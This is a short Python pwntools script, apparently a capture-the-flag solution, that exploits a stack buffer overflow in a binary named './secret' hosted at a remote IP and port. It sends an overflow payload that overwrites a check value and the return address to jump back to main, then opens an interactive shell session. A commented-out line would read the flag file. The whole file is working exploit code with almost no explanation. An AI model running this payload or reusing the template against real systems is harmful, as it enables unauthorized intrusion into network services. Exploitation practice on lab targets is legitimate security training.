#!/usr/bin/python3

from pwn import *
import sys

# change those
BINARY = './secret'
LIBC = ''
HOST = '140.110.112.77'
PORT = 6131

context.binary = BINARY
e = ELF( BINARY )
libc = ''

if LIBC != '':
    libc = ELF( LIBC )

if len(sys.argv) > 1:
    r = remote( HOST, PORT )
else: 
    r = process( BINARY )

main_addr= 0x0000000000400776

# because output is failed, I overwrite the ret and jumps to main
r.sendline(b'A'*28+p32(0xab37)+b'A'*0x8+p64(main_addr))
r.sendline('Y')

#r.sendline('cat /home/`whoami`/flag')
r.interactive()
